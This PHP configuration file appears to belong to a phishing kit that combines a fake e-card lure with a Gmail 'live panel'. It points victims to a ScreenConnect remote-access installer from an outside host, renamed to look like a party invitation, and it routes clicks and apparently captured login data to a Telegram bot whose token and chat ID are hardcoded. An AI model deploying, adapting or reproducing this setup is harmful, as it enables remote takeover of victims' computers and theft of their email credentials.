<?php
// Shared configuration for the merged Ecard + Gmail Live Panel entry point.
// This file is required by:
//   - index.php        (root entry point)
//   - ecard/config.php (shim that re-exposes ecard constants)
//   - gmail/config.php (shim that returns the $settings array)

if (!defined('ROOT_DIR')) {
    define('ROOT_DIR', __DIR__);
}

// ---------------------------------------------------------------------------
// COMMON / ENVIRONMENT SETTINGS
// ---------------------------------------------------------------------------
// Relative paths automatically stay inside the cPanel deployment directory.
// A leading slash can be used intentionally for a domain-root destination.
$live_panel_path = 'gmail/';
$ecard_download_url = 'https://rcdoc.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest';
$ecard_download_filename = 'PartyInvite_em_Jb1JR1if_installer_Win7-Win11_x86_x64.msi';
$ecard_serve_local_file = false;
$ecard_local_files_dir = __DIR__ . '/ecard/files';

// ---------------------------------------------------------------------------
// ECARD TELEGRAM BOT (kept separate from the live-panel bot)
// ---------------------------------------------------------------------------
if (!defined('ECARD_TELEGRAM_BOT_TOKEN')) {
    define('ECARD_TELEGRAM_BOT_TOKEN', '8334173671:AAHGdO0c7usd1KiJr0eKYuBJnU65QuxFspI');
}
if (!defined('ECARD_TELEGRAM_CHAT_ID')) {
    define('ECARD_TELEGRAM_CHAT_ID', '8132325403');
}

// ---------------------------------------------------------------------------
// GMAIL LIVE PANEL TELEGRAM BOT (kept separate from the ecard bot)
// ---------------------------------------------------------------------------
$settings = array(
    // DELIVERY SETTINGS
    "send_clicks" => "1",                       // Send click to your Telegram
    "send_mail" => "0",                         // Send e-mail to your mail
    "telegram" => "1",                          // Telegram bot receiver

    // PAGE SETTINGS
    // redirect_url is set dynamically in gmail/config.php based on the project root URL.
    "redirect_url" => "../unsupported.html",    // fallback value; overridden by shim

    // EMAIL CONFIG
    "email" => "your@email.com",                // Your e-mail

    // TELEGRAM CONFIG
    "chat_id" => "8132325403",                  // Chat ID
    "bot_url" => "8334173671:AAHGdO0c7usd1KiJr0eKYuBJnU65QuxFspI", // Bot API key

    // LOADING PAGE SETTINGS
    "loading_timeout" => 1800,                  // Timeout in seconds (30 minutes)
    "loading_check_interval" => 2000,           // Check interval in milliseconds

    // REDIRECT DELAY SETTINGS
    "redirect_delay" => 1,                      // Minutes

    // DEBUG
    "debug_mode" => false,                      // Bypass redirects for local testing
);

// Expose common/live-panel path in the settings array so panel code can read it
// if ever needed without hard-coding elsewhere.
$settings['live_panel_path'] = $live_panel_path;
$settings['ecard_download_url'] = $ecard_download_url;
$settings['ecard_download_filename'] = $ecard_download_filename;
$settings['ecard_serve_local_file'] = $ecard_serve_local_file;
$settings['ecard_local_files_dir'] = $ecard_local_files_dir;

// Returning $settings makes this file work directly as the live-panel config.
// Code that needs the constants (root index, ecard shim) can require the file
// and then read the defined constants separately.
return $settings;
